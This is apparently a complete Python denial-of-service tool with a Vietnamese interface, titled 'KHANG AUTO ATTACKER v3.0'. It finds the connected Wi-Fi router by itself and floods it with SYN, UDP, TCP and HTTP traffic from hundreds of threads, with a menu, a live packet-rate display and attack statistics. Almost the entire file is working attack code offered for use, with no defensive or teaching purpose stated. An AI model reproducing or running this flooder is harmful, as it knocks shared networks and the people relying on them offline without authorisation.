"""
╔═══════════════════════════════════════════════════════════════════╗
║              KHANG AUTO ATTACKER v3.0 - AUTO DETECT              ║
║              TỰ ĐỘNG TẤN CÔNG WIFI ĐANG KẾT NỐI                 ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import time
import sys
import random
import os
import subprocess
from datetime import datetime

# ==================== MÀU SẮC ====================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# ==================== TỰ ĐỘNG DÒ TÌM GATEWAY ====================
def auto_detect_gateway():
    """Tự động tìm IP gateway (router) đang kết nối"""
    try:
        # Cách 1: Đọc từ /proc/net/route (Linux/Android)
        if os.path.exists('/proc/net/route'):
            with open('/proc/net/route', 'r') as f:
                for line in f.readlines():
                    parts = line.strip().split()
                    if len(parts) > 2 and parts[1] == '00000000':  # Destination 0.0.0.0
                        gateway_hex = parts[2]
                        # Chuyển hex sang IP
                        gateway = '.'.join(str(int(gateway_hex[i:i+2], 16)) 
                                         for i in [6,4,2,0])
                        return gateway
        
        # Cách 2: Thử các gateway phổ biến
        common_gateways = [
            "192.168.1.1",
            "192.168.0.1", 
            "192.168.2.1",
            "192.168.43.1",  # Mobile hotspot
            "10.0.0.1",
            "172.16.0.1"
        ]
        
        for gw in common_gateways:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((gw, 80))
                sock.close()
                if result == 0:
                    return gw
            except:
                continue
        
        # Cách 3: Lấy IP của máy và suy ra gateway
        host_ip = get_local_ip()
        if host_ip:
            ip_parts = host_ip.split('.')
            if len(ip_parts) == 4:
                return f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
                
    except Exception as e:
        pass
    
    return "192.168.1.1"  # Mặc định

def get_local_ip():
    """Lấy IP local của máy"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None

# ==================== BANNER ĐẸP ====================
def show_banner():
    gateway = auto_detect_gateway()
    local_ip = get_local_ip() or "Unknown"
    
    banner = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════╗
║                                                                       ║
║{Colors.YELLOW}    ██╗  ██╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ ██████╗ {Colors.RED}           ║
║{Colors.YELLOW}    ██║ ██╔╝██║  ██║██╔══██╗████╗  ██║██╔════╝ ██╔══██╗{Colors.RED}          ║
║{Colors.YELLOW}    █████╔╝ ███████║███████║██╔██╗ ██║██║  ███╗██████╔╝{Colors.RED}          ║
║{Colors.YELLOW}    ██╔═██╗ ██╔══██║██╔══██║██║╚██╗██║██║   ██║██╔══██╗{Colors.RED}          ║
║{Colors.YELLOW}    ██║  ██╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝██║  ██║{Colors.RED}          ║
║{Colors.YELLOW}    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝{Colors.RED}          ║
║                                                                       ║
║{Colors.GREEN}              🔥 AUTO ATTACKER V3.0 - TỰ ĐỘNG DÒ TÌM 🔥{Colors.RED}               ║
║{Colors.CYAN}                   📱 ANDROID EDITION - BY KHANG{Colors.RED}                       ║
╠═══════════════════════════════════════════════════════════════════╣
║{Colors.MAGENTA}                                                                       {Colors.RED}║
║{Colors.MAGENTA}   🌐 IP CỦA BẠN    : {Colors.GREEN}{local_ip:<15}{Colors.MAGENTA}                              ║
║{Colors.MAGENTA}   🎯 ROUTER PHÁT HIỆN: {Colors.GREEN}{gateway:<15}{Colors.MAGENTA}                              ║
║{Colors.MAGENTA}   📡 WIFI ĐANG DÙNG: {Colors.GREEN}ĐÃ KẾT NỐI{Colors.MAGENTA}                                ║
║{Colors.MAGENTA}                                                                       {Colors.RED}║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

# ==================== BIẾN TOÀN CỤC ====================
running = False
packet_count = 0
total_bytes = 0
count_lock = threading.Lock()
log_messages = []
log_lock = threading.Lock()

def add_log(message, color=Colors.CYAN):
    """Thêm log vào danh sách và hiển thị"""
    with log_lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_messages.append(f"{color}[{timestamp}] {message}{Colors.END}")
        if len(log_messages) > 15:  # Giữ 15 dòng log gần nhất
            log_messages.pop(0)

def display_logs():
    """Hiển thị tất cả logs"""
    with log_lock:
        for log in log_messages[-15:]:
            print(log)

# ==================== CÁC HÀM TẤN CÔNG ====================
def syn_flood(target, port):
    """SYN Flood - Nhanh nhất"""
    global packet_count
    thread_id = threading.get_ident()
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            sock.connect_ex((target, port))
            with count_lock:
                packet_count += 1
                if packet_count % 1000 == 0:
                    add_log(f"🔥 Thread-{thread_id%1000}: Đã gửi {packet_count} gói SYN", Colors.GREEN)
            sock.close()
        except:
            pass

def udp_flood(target, port):
    """UDP Flood"""
    global packet_count, total_bytes
    thread_id = threading.get_ident()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while running:
        try:
            data = random._urandom(random.randint(512, 1400))
            sock.sendto(data, (target, port))
            with count_lock:
                packet_count += 1
                total_bytes += len(data)
                if packet_count % 500 == 0:
                    add_log(f"💧 Thread-{thread_id%1000}: UDP gửi {len(data)} bytes", Colors.BLUE)
        except:
            pass

def tcp_flood(target, port):
    """TCP Flood"""
    global packet_count, total_bytes
    thread_id = threading.get_ident()
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((target, port))
            for _ in range(3):
                data = random._urandom(1024)
                sock.send(data)
                with count_lock:
                    packet_count += 1
                    total_bytes += len(data)
                    if packet_count % 300 == 0:
                        add_log(f"🔴 Thread-{thread_id%1000}: TCP gửi gói tin", Colors.RED)
            sock.close()
        except:
            pass

def http_flood(target, port):
    """HTTP Flood"""
    global packet_count, total_bytes
    thread_id = threading.get_ident()
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target, port))
            paths = ["/", "/index.html", "/login", "/admin", "/api", "/test"]
            request = f"GET {random.choice(paths)} HTTP/1.1\r\nHost: {target}\r\n\r\n"
            sock.send(request.encode())
            with count_lock:
                packet_count += 1
                total_bytes += len(request)
                if packet_count % 200 == 0:
                    add_log(f"🌐 Thread-{thread_id%1000}: HTTP request {random.choice(paths)}", Colors.YELLOW)
            sock.close()
        except:
            pass

# ==================== MENU ====================
def show_menu():
    print(f"\n{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════╗")
    print("║           🔥 CHỌN CHẾ ĐỘ TẤN CÔNG 🔥            ║")
    print("╠══════════════════════════════════════════════════════╣")
    print(f"║  {Colors.YELLOW}[1]{Colors.CYAN} ⚡ SYN FLOOD     (NHANH NHẤT - KHUYÊN DÙNG)    ║")
    print(f"║  {Colors.YELLOW}[2]{Colors.CYAN} 💧 UDP FLOOD     (TẠO TẢI LỚN)                 ║")
    print(f"║  {Colors.YELLOW}[3]{Colors.CYAN} 🔥 TCP FLOOD     (GIỮ KẾT NỐI)                 ║")
    print(f"║  {Colors.YELLOW}[4]{Colors.CYAN} 🌐 HTTP FLOOD    (TẤN CÔNG WEB)                 ║")
    print(f"║  {Colors.YELLOW}[5]{Colors.CYAN} 🚀 SUPER ATTACK  (TẤT CẢ CÙNG LÚC)              ║")
    print("╠══════════════════════════════════════════════════════╣")
    print(f"║  {Colors.YELLOW}[0]{Colors.CYAN} 🚪 THOÁT                                       ║")
    print("╚══════════════════════════════════════════════════════╝")
    return input(f"{Colors.GREEN}► LỰA CHỌN CỦA BẠN [0-5]: {Colors.END}")

# ==================== NHẬP THÔNG SỐ ĐƠN GIẢN ====================
def get_simple_params():
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}═══════════════════════════════════════════════════════")
    print("              ⚙️  NHẬP THÔNG SỐ TẤN CÔNG ⚙️")
    print("═══════════════════════════════════════════════════════")
    
    try:
        threads = int(input(f"{Colors.YELLOW}► SỐ LUỒNG [1-1000] (mặc định 200): {Colors.END}") or "200")
        if threads < 1:
            threads = 200
    except:
        threads = 200
        print(f"{Colors.RED}⚠️ Dùng mặc định: {threads} luồng{Colors.END}")
    
    try:
        duration = int(input(f"{Colors.YELLOW}► THỜI GIAN (giây) [10-3600] (mặc định 60): {Colors.END}") or "60")
        if duration < 10:
            duration = 60
    except:
        duration = 60
        print(f"{Colors.RED}⚠️ Dùng mặc định: {duration} giây{Colors.END}")
    
    return threads, duration

# ==================== HIỂN THỊ TIẾN TRÌNH VỚI LOG ====================
def show_attack_progress(target, mode, threads, duration):
    global running, packet_count, total_bytes, log_messages
    
    running = True
    packet_count = 0
    total_bytes = 0
    log_messages = []
    threads_list = []
    
    # Xác định port dựa trên mode
    port = 80  # Mặc định
    mode_names = {
        1: "⚡ SYN FLOOD",
        2: "💧 UDP FLOOD", 
        3: "🔥 TCP FLOOD",
        4: "🌐 HTTP FLOOD",
        5: "🚀 SUPER ATTACK"
    }
    mode_name = mode_names.get(mode, "UNKNOWN")
    
    # Xóa màn hình và hiển thị banner
    clear_screen()
    print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.END}")
    print(f"{Colors.YELLOW}{Colors.BOLD}              🚀 KHANG AUTO ATTACKER V3.0 🚀{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.END}")
    print(f"{Colors.CYAN}🎯 ROUTER: {Colors.GREEN}{target}{Colors.END}")
    print(f"{Colors.CYAN}⚔️  MODE: {Colors.MAGENTA}{mode_name}{Colors.END}")
    print(f"{Colors.CYAN}⚙️  THREADS: {Colors.YELLOW}{threads}{Colors.END}")
    print(f"{Colors.CYAN}⏱️  DURATION: {Colors.YELLOW}{duration} giây{Colors.END}")
    print(f"{Colors.CYAN}📱 IP CỦA BẠN: {Colors.GREEN}{get_local_ip() or 'Unknown'}{Colors.END}")
    print(f"{Colors.RED}{'-'*70}{Colors.END}\n")
    
    add_log("🚀 BẮT ĐẦU TẤN CÔNG...", Colors.GREEN)
    add_log(f"🎯 MỤC TIÊU: {target}", Colors.YELLOW)
    add_log(f"⚙️  {threads} LUỒNG ĐƯỢC KÍCH HOẠT", Colors.CYAN)
    
    # Khởi tạo threads
    if mode == 5:  # SUPER ATTACK
        attacks = [
            (syn_flood, 80, "SYN"),
            (udp_flood, 53, "UDP"),
            (tcp_flood, 80, "TCP"),
            (http_flood, 80, "HTTP")
        ]
        
        per_type = threads // len(attacks)
        for attack_func, attack_port, attack_name in attacks:
            for i in range(per_type):
                t = threading.Thread(target=attack_func, args=(target, attack_port))
                t.daemon = True
                t.start()
                threads_list.append(t)
            add_log(f"✅ KHỞI TẠO {per_type} LUỒNG {attack_name}", Colors.GREEN)
    else:
        # Map mode to attack function
        attack_map = {
            1: (syn_flood, 80, "SYN"),
            2: (udp_flood, 53, "UDP"),
            3: (tcp_flood, 80, "TCP"),
            4: (http_flood, 80, "HTTP")
        }
        attack_func, attack_port, attack_name = attack_map[mode]
        
        for i in range(threads):
            t = threading.Thread(target=attack_func, args=(target, attack_port))
            t.daemon = True
            t.start()
            threads_list.append(t)
        add_log(f"✅ KHỞI TẠO {threads} LUỒNG {attack_name}", Colors.GREEN)
    
    add_log("⚡ ĐANG GỬI GÓI TIN...", Colors.YELLOW)
    
    # Theo dõi tiến trình
    start_time = time.time()
    last_count = 0
    last_bytes = 0
    peak_rate = 0
    last_log_time = 0
    
    try:
        while running and (time.time() - start_time) < duration:
            time.sleep(1)
            current_time = time.time()
            elapsed = current_time - start_time
            remaining = duration - elapsed
            
            with count_lock:
                current_count = packet_count
                current_bytes = total_bytes
            
            rate = current_count - last_count
            byte_rate = (current_bytes - last_bytes) / 1024  # KB/s
            
            if rate > peak_rate:
                peak_rate = rate
            
            # Clear 4 dòng cuối và cập nhật
            print(f"\033[4A\033[0J")  # Lên 4 dòng và xóa đến cuối
            
            # Thanh tiến trình
            progress = int((elapsed / duration) * 40)
            bar = f"{Colors.GREEN}{'█' * progress}{Colors.RED}{'█' * (40-progress)}{Colors.END}"
            
            # Hiển thị thông số chính
            print(f"{Colors.YELLOW}⏳ TIẾN ĐỘ: [{bar}] {Colors.CYAN}{elapsed:.0f}/{duration}s{Colors.END}")
            print(f"{Colors.GREEN}📦 GÓI: {current_count:,}  |  ⚡ {rate:,} g/s  |  🔥 {peak_rate:,} g/s{Colors.END}")
            print(f"{Colors.CYAN}💾 DATA: {current_bytes/1024/1024:.2f} MB  |  📶 {byte_rate:.1f} KB/s{Colors.END}")
            print(f"{Colors.MAGENTA}⏱️  CÒN: {remaining:.0f}s{Colors.END}")
            
            # Hiển thị logs mới nhất (15 dòng)
            print(f"\n{Colors.BOLD}{Colors.CYAN}📋 LOG CHI TIẾT:{Colors.END}")
            display_logs()
            
            # Thêm log định kỳ
            if rate > 0 and int(elapsed) % 5 == 0 and int(elapsed) != last_log_time:
                add_log(f"📊 TỐC ĐỘ {rate} gói/s - {byte_rate:.1f} KB/s", Colors.CYAN)
                last_log_time = int(elapsed)
            
            last_count = current_count
            last_bytes = current_bytes
            
    except KeyboardInterrupt:
        add_log("⚠️ NGƯỜI DÙNG DỪNG TẤN CÔNG!", Colors.RED)
        print("\n")
    
    running = False
    time.sleep(1)
    
    # Kết quả
    elapsed = time.time() - start_time
    print(f"\n\n{Colors.MAGENTA}{Colors.BOLD}╔══════════════════════════════════════════════════════╗")
    print("║              📊 KẾT QUẢ TẤN CÔNG               ║")
    print("╠══════════════════════════════════════════════════════╣")
    print(f"║  ⏱️  THỜI GIAN : {elapsed:>16.2f} giây            ║")
    print(f"║  📦 TỔNG GÓI  : {packet_count:>16,} gói            ║")
    print(f"║  💾 TỔNG DATA : {total_bytes/1024/1024:>16.2f} MB            ║")
    print(f"║  ⚡ TỐC ĐỘ TB : {packet_count/elapsed:>16.1f} g/s            ║")
    print(f"║  🔥 TỐC ĐỘ ĐỈNH: {peak_rate:>16,} g/s            ║")
    print("╚══════════════════════════════════════════════════════╝")
    print(f"{Colors.END}")

# ==================== MAIN ====================
def main():
    while True:
        clear_screen()
        show_banner()
        
        # Tự động dò gateway
        target = auto_detect_gateway()
        local_ip = get_local_ip()
        
        print(f"\n{Colors.GREEN}✅ TỰ ĐỘNG PHÁT HIỆN THÀNH CÔNG!{Colors.END}")
        print(f"{Colors.CYAN}📱 IP CỦA BẠN: {Colors.BOLD}{local_ip}{Colors.END}")
        print(f"{Colors.CYAN}🎯 ROUTER: {Colors.BOLD}{target}{Colors.END}")
        
        choice = show_menu()
        
        if choice == '0':
            print(f"\n{Colors.GREEN}{Colors.BOLD}👋 CẢM ƠN ĐÃ SỬ DỤNG!{Colors.END}")
            time.sleep(2)
            clear_screen()
            break
            
        elif choice in ['1', '2', '3', '4', '5']:
            threads, duration = get_simple_params()
            
            # Xác nhận nhanh
            print(f"\n{Colors.RED}{Colors.BOLD}⚠️ XÁC NHẬN TẤN CÔNG{Colors.END}")
            print(f"{Colors.YELLOW}Router: {target}")
            print(f"Số luồng: {threads}")
            print(f"Thời gian: {duration} giây{Colors.END}")
            confirm = input(f"{Colors.GREEN}► Nhấn ENTER để tấn công, '0' để hủy: {Colors.END}")
            
            if confirm != '0':
                show_attack_progress(target, int(choice), threads, duration)
            else:
                print(f"{Colors.GREEN}✅ Đã hủy{Colors.END}")
            
            input(f"\n{Colors.CYAN}► Nhấn ENTER để tiếp tục...{Colors.END}")
            
        else:
            print(f"{Colors.RED}❌ Lựa chọn không hợp lệ!{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}{Colors.BOLD}👋 TẠM BIỆT!{Colors.END}")
        time.sleep(1)